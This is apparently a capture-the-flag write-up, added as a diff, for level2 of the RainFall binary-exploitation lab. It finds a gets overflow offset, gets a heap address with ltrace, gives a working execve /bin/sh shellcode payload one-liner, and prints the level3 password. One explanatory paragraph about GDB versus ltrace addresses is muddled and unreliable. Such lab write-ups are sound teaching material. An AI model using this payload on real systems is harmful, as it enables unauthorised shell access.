@@ -1,0 +1,51 @@
+we can see when we decompilate the exec file that there is a p function with one vulnerabilitie the gets function.
+
+with this site i generate a string pattern to calculate the good eip for the right offset:
+https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
+
+level2@RainFall:/tmp$ echo 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag' > input.txt
+
+level2@RainFall:~$ gdb ./level2 
+
+(gdb) run < /tmp/input.txt
+Starting program: /home/user/level2/level2 < /tmp/input.txt
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
+
+then pas this eip address into the website: we learn that the offset is 80.
+we need to inject a shellcode into the gets. 
+
+but also the it isn't possible to inject on the stacj because there is a protection :
+https://infosecwriteups.com/expdev-exploit-exercise-protostar-stack-6-ef75472ec7c6
+
+The address of malloc obtained through GDB and the address displayed by ltrace may differ because GDB shows the address within the specific running instance of your program,
+ while ltrace shows the address of the library function used by the program. 
+The underlying reason for this difference is that the program's memory layout and library loading can vary across different runs and environments.
+
+If you are interested in the address of malloc as used by your program during runtime, 
+you can use ltrace to trace the malloc calls and see the address that corresponds to the dynamically linked library function being used at that moment.
+
+To summarize, the address of malloc shown by GDB is specific to the running instance of your program, 
+while ltrace shows the address of the library function used by the program during runtime,
+ which may remain consistent across different runs.
+
+with ltrace we get the return of the heap:
+level2@RainFall:~$ ltrace ./level2 
+__libc_start_main(0x804853f, 1, 0xbffff7e4, 0x8048550, 0x80485c0 <unfinished ...>
+fflush(0xb7fd1a20)                                                                               = 0
+gets(0xbffff6ec, 0, 0, 0xb7e5ec73, 0x80482b5
+)                                                    = 0xbffff6ec
+puts(""
+)                                                                                         = 1
+strdup("")                                                                                       = 0x0804a008
++++ exited (status 8) +++
+
+https://www.exploit-db.com/exploits/42428 for shellcode.
+whe are in the heap so the shellcode is at the begining of the string:
+(python -c 'print "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*56 + "\x08\xa0\x04\x08"' ; cat) | ./level2
+
+and then you have access to stdin and to level3 permissions => 
+cat /home/user/level3/.pass                            
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
